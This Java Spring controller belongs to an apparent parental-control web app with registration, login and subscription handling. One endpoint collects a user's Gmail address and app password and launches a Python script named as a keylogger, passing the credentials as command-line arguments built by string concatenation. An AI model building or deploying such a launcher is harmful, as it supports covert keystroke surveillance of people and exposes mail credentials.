package com.parental.control;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;
import java.io.*;
import java.sql.*;

@Controller
public class parentController {

    @GetMapping("/")
    public String sendForm(){
        return "parentsInControl.html";
    }

    @GetMapping("/register")
    public String processForm(Model model){
        model.addAttribute("user",new User());
        return "register.html";
    }

    @GetMapping("/login")
    public String processLogin(Model model)
    {
        model.addAttribute("user",new User());
        return "login.html";
    }

    @PostMapping("/process_login")
    public String processLogin(User user)
    {
        System.out.println(user.toString());
        createTableIfNotExists();
        login(user);
        System.out.println(user.toString());
        if (user.isCheckIfWrongUserPasswordCombination())
            return "login.html";
        return "store.html";
    }

    @PostMapping("/process_register")
    public String processRegister(Model model, final RedirectAttributes redirectAttributes, User user)
    {
        BCryptPasswordEncoder passwordEncoder=new BCryptPasswordEncoder();
        String encodedPassword=passwordEncoder.encode(user.getPassword());
        user.setPassword(encodedPassword);
        System.out.println(user.toString());
        model.addAttribute("user",user);
        redirectAttributes.addFlashAttribute("user",model);
        createTableIfNotExists();
        registerUser(user);
        if (user.isCheckIfUserAlreadyExists()||user.isCheckIfEmailAlreadyExists())
            return "register.html";
        return "redirect:subscribe";
    }

    @GetMapping("/subscribe")
    public ModelAndView subscriptionPage(@ModelAttribute("user") Model model){
        ModelAndView mav=new ModelAndView("subscription.html");
        mav.addObject("user",model.getAttribute("user"));
        return mav;
    }

    @PostMapping("/process_subscription")
    public String processSub(User user){
        System.out.println("User: "+user.getUsername());
        updateUser(user);
        return "store.html";
    }

    @PostMapping("/process_gmail")
    public String processGmail(User user){
        // afto einai to webapp. 8a mporouse na ginei kai kanoniko exe me to pyinstaller. An anoiga ekleina kai ekana compile
        String command="python3 src/main/resources/python/keyloggerLinMailWebapp.py";
        String params=' '+user.getGmail()+' '+user.getApp_password();
        try{
            System.out.println("Running process");
            Process p= Runtime.getRuntime().exec(command+params);
            System.out.println("Finished process");
        }
        catch (IOException ex){
            System.out.println("process fishy");
            ex.printStackTrace();
        }
        return "store.html";
    }

    private static void updateUser(User user){
        String query="UPDATE USER SET PLAN=? WHERE USERNAME=? ";
        try (Connection connection=connect()){
            connection.setAutoCommit(false);
            try (PreparedStatement pst=connection.prepareStatement(query)){
                pst.setString(1,user.getPlan());
                pst.setString(2,user.getUsername());
                pst.execute();
            }
            connection.commit();
        }catch (SQLException e){
            e.printStackTrace();
        }
    }

    private static boolean checkIfUsernameExists(User user,Connection connection){
        String checkUser="SELECT * FROM USER WHERE USERNAME=?";
        try (PreparedStatement pst=connection.prepareStatement(checkUser)){
            pst.setString(1,user.getUsername());
            try(ResultSet rs=pst.executeQuery()){
                if (!rs.isBeforeFirst())
                    return false;
                System.out.println("User is already there");
                user.setCheckIfUserAlreadyExists(true);
                return true;
            }
        }
        catch (SQLException e){
            e.printStackTrace();
        }
        return true;
    }

    private static boolean checkIfEmailExists(User user,Connection connection){
        String checkUser="SELECT * FROM USER WHERE EMAIL=?";
        try (PreparedStatement pst=connection.prepareStatement(checkUser)){
            pst.setString(1,user.getEmail());
            try(ResultSet rs=pst.executeQuery()){
                if (!rs.isBeforeFirst())
                    return false;
                System.out.println("Email is already there");
                user.setCheckIfEmailAlreadyExists(true);
                return true;
            }
        }
        catch (SQLException e){
            e.printStackTrace();
        }
        return true;
    }

    private static void login(User user)
    {
        try (Connection connection=connect()){
            connection.setAutoCommit(false);
            String query="SELECT * FROM USER WHERE USERNAME=?";
            try (PreparedStatement pst=connection.prepareStatement(query))
            {
                pst.setString(1,user.getUsername());
                try (ResultSet rs=pst.executeQuery())
                {
                    if (!rs.isBeforeFirst())
                    {
                        System.out.println("No data");
                        user.setCheckIfWrongUserPasswordCombination(true);
                        return;
                    }
                    BCryptPasswordEncoder passwordEncoder=new BCryptPasswordEncoder();
                    while (rs.next())
                    {
                        if (!passwordEncoder.matches(user.getPassword(),rs.getString(5)))
                        {
                            System.out.println("Wrong password");
                            user.setCheckIfWrongUserPasswordCombination(true);
                        }
                    }
                }
            }
        }
        catch (SQLException ex)
        {
            ex.printStackTrace();
        }
    }

    private static void registerUser(User user){
        try(Connection connection=connect()){
            connection.setAutoCommit(false);
            boolean usernameExistsAlready=checkIfUsernameExists(user,connection);
            boolean emailExistsAlready=checkIfEmailExists(user,connection);
            if (usernameExistsAlready||emailExistsAlready)
                return;
            String query="INSERT INTO USER (username,firstname,lastname,email,password)" +
                    " values(?,?,?,?,?)";
            try (PreparedStatement pst=connection.prepareStatement(query)){
                pst.setString(1,user.getUsername());
                pst.setString(2,user.getFirstname());
                pst.setString(3,user.getLastname());
                pst.setString(4,user.getEmail());
                pst.setString(5,user.getPassword());
                pst.execute();
            }
            connection.commit();
        }catch (SQLException exception){
            exception.printStackTrace();
        }
    }

    private static void createTableIfNotExists(){
        try (Connection connection=connect()){
            String createTableSQL="CREATE TABLE IF NOT EXISTS USER(USERNAME NOT NULL PRIMARY KEY," +
                    "FIRSTNAME TEXT NOT NULL," +
                    " LASTNAME TEXT NOT NULL," +
                    " EMAIL TEXT NOT NULL," +
                    " PASSWORD TEXT NOT NULL)";
            try (PreparedStatement pst=connection.prepareStatement(createTableSQL)){
                pst.execute();
            }
        }catch (SQLException ex){
            ex.printStackTrace();
        }
    }

    private static Connection connect(){
        String url="jdbc:sqlite:src/main/resources/DB/parentalUser.db";
        Connection connection=null;
        try{
            connection= DriverManager.getConnection(url);
        }catch (SQLException ex){
            ex.printStackTrace();
        }
        return connection;
    }
}
